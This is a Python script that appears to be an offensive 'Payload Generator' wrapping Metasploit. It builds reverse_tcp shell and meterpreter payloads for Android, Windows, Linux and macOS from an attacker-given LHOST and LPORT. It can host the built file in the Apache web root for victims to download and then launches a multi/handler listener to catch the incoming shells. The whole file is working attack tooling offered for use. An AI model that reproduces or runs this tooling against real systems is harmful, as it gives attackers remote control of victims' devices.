import os
import sys

yes = {'yes', 'y'}
no = {'no', 'n'}


def banner():
    print("""
    
    		Payload Generator
                        


%s
List payloads:

 1) Binary Payloads
 2) Web Payloads
 0) Exit
""")
    banner = input("Please choose the payload type : ")
    print("")

    if banner == "1":
        binary()
    elif banner == "2":
        print("Still in progress")
    else:
        sys.exit()


def msf():
    print("Do You Want To Install it ? : ")
    ch = input()
    if ch in yes:
        os.system(
            "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall")
    else:
        print("Leaving")
        sys.exit(0)


def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


def binary():
    print("""
  1) Android
  2) Windows
  3) Linux
  4) Mac OS
  5) Back to options
""")

    bn = input("Set Payload: ")
    print("")
    if bn == "1":
        android()
    elif bn == "2":
        windows()
    elif bn == "3":
        linux()
    elif bn == "4":
        mac()
    else:
        banner()


def android():
    lhost = input("Enter LHOST: ")
    lport = input("Enter LPORT: ")
    name = input("Enter Payload Name: ")
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s.apk" % (lhost, lport, name))
    clear()
    print("Payload Successfully Generated")
    print("[1]-Do You Want To Start a listener")
    print("[2]-Do You Want To Start an IP Poisoner ")
    li = input()
    if li == '2':
        os.system('sudo service apache2 start')
        os.system('sudo cp %s.apk /var/www/html' % (name))
        print("Your IP Successfully Poisoned : %s/%s.apk" % (lhost, name))
        listen = """
		use exploit/multi/handler
		set PAYLOAD android/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost, lport)
        with open('listener.rc', 'w') as f:
            f.write(listen)
        os.system('msfconsole -r listener.rc')

    else:
        listen = """
		use exploit/multi/handler
		set PAYLOAD android/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost, lport)
        with open('listener.rc', 'w') as f:
            f.write(listen)
        os.system('msfconsole -r listener.rc')


def windows():
    lhost = input("Enter LHOST: ")
    lport = input("Enter LPORT: ")
    name = input("Enter Payload Name: ")
    os.system("msfvenom -p windows/shell/reverse_tcp LHOST=%s LPORT=%s -f exe > %s.exe" % (lhost, lport, name))
    clear()
    print("Payload Successfully Generated")
    print("[1]-Do You Want To Start a listener")
    print("[2]-Do You Want To Start an IP Poisoner ")
    li = input()
    if li == '2':
        os.system('sudo service apache2 start')
        os.system('sudo cp %s.exe /var/www/html' % (name))
        print("Your IP Successfully Poisoned : %s/%s.exe" % (lhost, name))
        listen = """
		use exploit/multi/handler
		set PAYLOAD windows/shell/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost, lport)
        with open('listener.rc', 'w') as f:
            f.write(listen)
        os.system('msfconsole -r listener.rc')

    else:
        listen = """
		use exploit/multi/handler
		set PAYLOAD windows/shell/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost, lport)
        with open('listener.rc', 'w') as f:
            f.write(listen)
        os.system('msfconsole -r listener.rc')


def linux():
    lhost = input("Enter LHOST: ")
    lport = input("Enter LPORT: ")
    name = input("Enter Payload Name: ")
    os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > %s.elf" % (lhost, lport, name))
    clear()
    print("Payload Successfuly Generated")
    print("[1]-Do You Want To Start a listenner")
    print("[2]-Do You Want To Start an IP Poisener ")
    li = input()
    if li == '2':
        os.system('sudo service apache2 start')
        os.system('sudo cp %s.elf /var/www/html' % (name))
        print("Your IP Successfully Poisened : %s/%s.elf" % (lhost, name))
        listen = """
		use exploit/multi/handler
		set PAYLOAD linux/x86/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost, lport)
        with open('listener.rc', 'w') as f:
            f.write(listen)
        os.system('msfconsole -r listener.rc')

    else:
        listen = """
		use exploit/multi/handler
		set PAYLOAD linux/x86/meterpreter/reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost, lport)
        with open('listener.rc', 'w') as f:
            f.write(listen)
        os.system('msfconsole -r listener.rc')


def mac():
    lhost = input("Enter LHOST: ")
    lport = input("Enter LPORT: ")
    name = input("Enter Payload Name: ")
    os.system("msfvenom -p osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f macho > %s.macho" % (lhost, lport, name))
    clear()
    print("Payload Successfully Generated")
    print("[1]-Do You Want To Start a listenner")
    print("[2]-Do You Want To Start an IP Poisener ")
    li = input()
    if li == '2':
        os.system('sudo service apache2 start')
        os.system('sudo cp %s.macho /var/www/html' % (name))
        print("Your IP Successfully Poisoned : %s/%s.macho" % (lhost, name))
        listen = """
		use exploit/multi/handler
		set PAYLOAD osx/x86/shell_reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost, lport)
        with open('listener.rc', 'w') as f:
            f.write(listen)
        os.system('msfconsole -r listener.rc')

    else:
        listen = """
		use exploit/multi/handler
		set PAYLOAD osx/x86/shell_reverse_tcp
		set LHOST {0}
		set LPORT {1}
		exploit
		""".format(lhost, lport)
        with open('listener.rc', 'w') as f:
            f.write(listen)
        os.system('msfconsole -r listener.rc')


banner()
